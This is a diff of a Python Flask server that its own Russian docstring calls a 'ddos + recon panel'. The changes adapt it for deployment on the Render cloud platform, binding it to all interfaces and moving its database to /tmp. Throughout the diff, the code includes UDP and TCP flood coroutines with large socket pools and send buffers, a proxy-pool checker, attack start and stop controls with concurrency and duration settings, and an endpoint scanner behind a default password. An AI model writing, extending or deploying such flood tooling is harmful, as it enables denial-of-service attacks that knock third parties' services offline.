@@ -1,81 +1,26 @@
 #!/usr/bin/env python3
 """
-hoster — сервер ddos-панели.
-сам ставит библиотеки, поднимает flask, открывает браузер.
+hoster — ddos + recon панель. версия для Render.
+запуск локально: python run.py
+запуск на Render: gunicorn run:app
 """
 
 import os
-import sys
 import time
 import json
 import sqlite3
 import threading
-import subprocess
-import webbrowser
+import random
+import socket
+import asyncio
+import tempfile
 from pathlib import Path
 from datetime import datetime
 from functools import wraps
-from urllib.parse import urlparse
+from urllib.parse import urlparse, urljoin
 
-# ═══════════════════════════════════════════
-# АВТОУСТАНОВКА
-# ═══════════════════════════════════════════
-REQUIRED = [
-    ("flask", "flask"),
-    ("requests", "requests"),
-    ("aiohttp", "aiohttp"),
-    ("beautifulsoup4", "bs4"),
-    ("whois", "whois"),
-    ("dnspython", "dns"),
-    ("httpx", "httpx"),
-]
-
-def ensure_deps():
-    print("[*] проверяю зависимости...")
-    missing = []
-    for pkg, imp in REQUIRED:
-        try:
-            __import__(imp)
-        except ImportError:
-            missing.append(pkg)
-    if os.name == "posix" and sys.platform != "darwin":
-        try:
-            import uvloop  # noqa
-        except ImportError:
-            missing.append("uvloop")
-    if not missing:
-        print("[+] всё на месте")
-        return
-    print(f"[*] ставлю: {', '.join(missing)}")
-    for pkg in missing:
-        for args in (
-            [sys.executable, "-m", "pip", "install", pkg, "--quiet"],
-            [sys.executable, "-m", "pip", "install", "--user", pkg, "--quiet"],
-        ):
-            try:
-                subprocess.check_call(
-                    args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
-                )
-                break
-            except Exception:
-                continue
-    print("[+] готово")
-
-ensure_deps()
-
-try:
-    import uvloop
-    uvloop.install()
-    HAS_UVLOOP = True
-except ImportError:
-    HAS_UVLOOP = False
-
-import asyncio
-import random
-import socket
-
-import aiohttp
 import requests as req
+import aiohttp
 from flask import (
     Flask, Response, g, jsonify, redirect, render_template,
     request, session, stream_with_context,
@@ -90,19 +35,30 @@ try:
 except ImportError:
     HAS_HTTPX = False
 
+# uvloop опционален — на Render недоступен
+try:
+    import uvloop
+    uvloop.install()
+    HAS_UVLOOP = True
+except ImportError:
+    HAS_UVLOOP = False
+
 
 # ═══════════════════════════════════════════
 # КОНФИГ
 # ═══════════════════════════════════════════
 APP_PASSWORD = os.getenv("NETSUITE_PASS", "hoster")
-TURNSTILE_SITEKEY = "1x00000000000000000000AA"
-TURNSTILE_SECRET  = "1x0000000000000000000000000000000AA"
+SECRET_KEY   = os.getenv("SECRET_KEY", os.urandom(32).hex())
 
-BASE_DIR = Path(__file__).parent
-DB_PATH  = BASE_DIR / "hoster.db"
+TURNSTILE_SITEKEY = os.getenv("TURNSTILE_SITEKEY", "1x00000000000000000000AA")
+TURNSTILE_SECRET  = os.getenv("TURNSTILE_SECRET",  "1x0000000000000000000000000000000AA")
+
+# на Render рабочая папка read-only, БД кладём в /tmp
+DB_PATH = Path(os.getenv("DB_PATH", "/tmp/hoster.db"))
+DB_PATH.parent.mkdir(parents=True, exist_ok=True)
 
 PORT = int(os.getenv("PORT", 5000))
-HOST = os.getenv("HOST", "127.0.0.1")
+HOST = os.getenv("HOST", "0.0.0.0")
 
 
 # ═══════════════════════════════════════════
@@ -177,26 +133,28 @@ class ProxyPool:
             pass
         return None
 
-    def check_all(self, workers=200):
+    def check_all(self, workers=100):
         from concurrent.futures import ThreadPoolExecutor
         self.checking = True
         alive = []
-        with ThreadPoolExecutor(max_workers=workers) as ex:
-            futures = [ex.submit(self._check_one, p) for p in self.all]
-            for f in futures:
-                try:
-                    r = f.result(timeout=10)
-                    if r:
-                        alive.append(r)
-                except Exception:
-                    continue
-        with self.lock:
-            self.alive = alive
-            self.bad = set(self.all) - set(alive)
-            self.stats["alive"] = len(alive)
-            self.stats["dead"] = len(self.all) - len(alive)
-            self.stats["last"] = time.time()
-        self.checking = False
+        try:
+            with ThreadPoolExecutor(max_workers=workers) as ex:
+                futures = [ex.submit(self._check_one, p) for p in self.all]
+                for f in futures:
+                    try:
+                        r = f.result(timeout=10)
+                        if r:
+                            alive.append(r)
+                    except Exception:
+                        continue
+        finally:
+            with self.lock:
+                self.alive = alive
+                self.bad = set(self.all) - set(alive)
+                self.stats["alive"] = len(alive)
+                self.stats["dead"] = len(self.all) - len(alive)
+                self.stats["last"] = time.time()
+            self.checking = False
         return len(alive)
 
     def get(self):
@@ -374,7 +332,7 @@ class AttackState:
             self.logs.append(line)
             if len(self.logs) > 500:
                 self.logs = self.logs[-500:]
-        print(line)
+        print(line, flush=True)
 
     def snapshot(self):
         with self.lock:
@@ -476,12 +434,12 @@ async def udp_flood(host, port, conc, size=64):
     target = random.choice(targets)
 
     sock_pool = []
-    for _ in range(min(conc, 1024)):
+    for _ in range(min(conc, 512)):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             try: s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
             except: pass
-            try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
+            try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
             except: pass
             s.setblocking(False)
             sock_pool.append(s)
@@ -529,7 +487,7 @@ async def tcp_flood(host, port, conc):
 
 
 def _run_loop(mode, host, port, url, conc):
-    loop = uvloop.new_event_loop() if HAS_UVLOOP else asyncio.new_event_loop()
+    loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
 
     async def main():
@@ -579,7 +537,7 @@ def start_attack(mode, target, conc, duration):
     STATE.concurrency = conc; STATE.duration = duration
     STATE.logs = []
     STATE.log(f"запуск: mode={mode} target={host}:{port}{path}")
-    STATE.log(f"conc={conc} dur={duration}с uvloop={HAS_UVLOOP} прокси={POOL.alive_count()}")
+    STATE.log(f"conc={conc} dur={duration}с прокси={POOL.alive_count()}")
 
     def runner():
         threading.Thread(target=_reporter, daemon=True).start()
@@ -597,10 +555,10 @@ def stop_attack():
 
 
 # ═══════════════════════════════════════════
-# FLASK
+# FLASK APP
 # ═══════════════════════════════════════════
 app = Flask(__name__)
-app.secret_key = os.getenv("SECRET_KEY", os.urandom(32).hex())
+app.secret_key = SECRET_KEY
 
 
 def db():
@@ -657,6 +615,11 @@ def index():
                            uvloop=HAS_UVLOOP)
 
 
+@app.route("/healthz")
+def healthz():
+    return "ok", 200
+
+
 @app.route("/api/state")
 @login_required
 def api_state():
@@ -668,6 +631,7 @@ def api_state():
 def api_logs_stream():
     def gen():
         last_idx = 0
+        empty_count = 0
         while True:
             with STATE.lock:
                 logs = list(STATE.logs)
@@ -677,6 +641,9 @@ def api_logs_stream():
                 yield f"data: {json.dumps({'line': line})}\n\n"
             yield f"data: {json.dumps({'state': STATE.snapshot()})}\n\n"
             time.sleep(0.5)
+            empty_count += 1
+            if empty_count > 7200:
+                break
     return Response(stream_with_context(gen()), mimetype="text/event-stream",
                     headers={"Cache-Control": "no-cache",
                              "X-Accel-Buffering": "no"})
@@ -809,7 +776,6 @@ def api_proxy_status():
 @login_required
 def api_scan_endpoints():
     import re as _re
-    from urllib.parse import urljoin
     d = request.json or {}
     url = (d.get("url") or "").strip()
     if not url:
@@ -845,19 +811,11 @@ def api_scan_endpoints():
 
 
 # ═══════════════════════════════════════════
-# ЗАПУСК
+# ЛОКАЛЬНЫЙ ЗАПУСК (на Render не сработает)
 # ═══════════════════════════════════════════
-def open_browser_later():
-    time.sleep(1.5)
-    try:
-        webbrowser.open(f"http://127.0.0.1:{PORT}")
-    except Exception:
-        pass
-
-
 if __name__ == "__main__":
     print("=" * 55)
-    print("  hoster — ddos + recon панель")
+    print("  hoster — локальный запуск")
     print("=" * 55)
     print(f"  пароль:   {APP_PASSWORD}")
     print(f"  uvloop:   {'да' if HAS_UVLOOP else 'нет'}")
@@ -865,8 +823,4 @@ if __name__ == "__main__":
     print(f"  БД:       {DB_PATH}")
     print(f"  сервер:   http://{HOST}:{PORT}")
     print("=" * 55)
-
-    if HOST == "127.0.0.1":
-        threading.Thread(target=open_browser_later, daemon=True).start()
-
     app.run(host=HOST, port=PORT, debug=False, threaded=True)
